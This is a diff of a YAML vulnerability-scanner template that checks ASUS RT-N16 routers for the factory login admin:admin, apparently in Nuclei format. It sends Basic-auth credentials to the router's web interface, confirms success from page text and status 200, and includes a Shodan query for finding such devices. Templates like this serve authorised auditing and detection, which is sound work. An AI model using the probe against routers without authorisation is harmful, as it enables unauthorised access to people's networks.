@@ -1,4 +1,5 @@
 id: asus-rtn16-default-login
+
 info:
   name: ASUS RT-N16 - Default Login
   author: ritikchaddha
@@ -8,35 +9,39 @@ info:
   classification:
     cpe: cpe:2.3:h:asus:rt-n16:*:*:*:*:*:*:*:*
   metadata:
-    runzero-match: any(each(service["http.head.wwwAuthentications"]), {# contains 'realm="RT-N16'})
-    max-request: 1
-    product: rt-n16
-    shodan-query: RT-N16
-    vendor: asus
     verified: true
-  tags: asus,default-login,rt-n16,vuln
+    max-request: 1
+    vendor: asus
+    product: rt-n16
+    shodan-query: "RT-N16"
+  tags: default-login,asus,rt-n16,vuln
+
 http:
-  - attack: pitchfork
-    headers:
-      Authorization: Basic {{base64(username + ':' + password)}}
-    matchers:
-      - condition: and
-        part: body
-        type: word
-        words:
-          - ASUS
-          - RT-N16
-          - System Status
-          - Network Map
-      - status:
-          - 200
-        type: status
-    matchers-condition: and
-    method: GET
+  - method: GET
     path:
-      - '{{BaseURL}}/'
+      - "{{BaseURL}}/"
+    headers:
+      Authorization: "Basic {{base64(username + ':' + password)}}"
+
+    attack: pitchfork
     payloads:
-      password:
-        - admin
       username:
         - admin
+      password:
+        - admin
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'ASUS'
+          - 'RT-N16'
+          - 'System Status'
+          - 'Network Map'
+        condition: and
+
+      - type: status
+        status:
+          - 200
+# digest: 4a0a004730450220759483c20aa388ab19b30fee9912b8d6dfd67c085fa61abe37c95221154cf486022100bbb3c6afa1d49c652ed053f940bfd2dac006c8dfc092588e988d90c815240b90:922c64590222798bb761d5b6d8e72950
